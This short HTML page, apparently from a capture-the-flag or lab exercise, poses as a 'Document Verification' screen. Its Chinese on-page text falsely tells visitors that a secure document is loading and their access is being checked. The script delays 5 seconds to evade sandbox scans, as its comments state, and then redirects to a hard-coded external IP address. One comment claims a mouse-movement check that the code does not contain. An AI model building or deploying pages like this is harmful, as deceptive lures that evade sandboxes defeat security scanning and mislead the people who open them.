<!DOCTYPE html>
<html>
<head>
    <title>Document Verification</title>
    <script>
        // 绕过策略：沙箱通常不会模拟复杂的人机交互，也不会等待太久
        function verifyAndRedirect() {
            console.log("Checking environment...");
            
            // 延迟 5 秒执行，避开大多数沙箱的快速扫描
            setTimeout(function() {
                // 只有当用户在页面上有移动鼠标或点击行为时才跳转
                // 靶机地址假设为：http://target-internal:8080/flag
                window.location.href = "http://47.93.144.150:8080/flag";
            }, 5000); 
        }
    </script>
</head>
<body onload="verifyAndRedirect()" style="font-family: sans-serif; text-align: center; padding-top: 50px;">
    <h2>正在加载安全文档...</h2>
    <p>请稍候，系统正在验证您的访问权限。</p>
    <div style="margin-top: 20px;">
        <progress></progress>
    </div>
</body>
</html>
